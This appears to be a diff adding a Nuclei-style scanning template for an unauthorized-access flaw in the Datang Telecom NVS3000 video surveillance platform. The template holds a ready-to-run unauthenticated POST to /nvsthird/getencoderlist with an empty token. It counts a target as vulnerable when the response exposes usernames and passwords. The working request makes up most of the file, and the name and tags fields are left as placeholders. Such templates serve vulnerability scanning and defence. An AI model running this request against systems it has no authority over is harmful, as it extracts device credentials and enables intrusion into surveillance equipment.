@@ -1,0 +1,33 @@
+id: datang-NVS3000-getencoderlist-weak
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 大唐电信科技股份有限公司NVS3000综合视频监控平台 /nvsthird/getencoderlist 存在未授权访问，可获取设备账号密码。
+  reference:
+    - https://github.com/wy876/POC/blob/38c637c345afb250de493919c954bdb15b8fe060/%E5%A4%A7%E5%94%90%E7%94%B5%E4%BF%A1NVS3000%E7%BB%BC%E5%90%88%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0getencoderlist%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /nvsthird/getencoderlist HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/json
+        Accept-Encoding: gzip, deflate
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.9
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+        Content-Length: 39
+
+        {"token":"","fromindex":0,"toindex":-1}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - password
+      - type: word
+        part: body
+        words:
+          - username
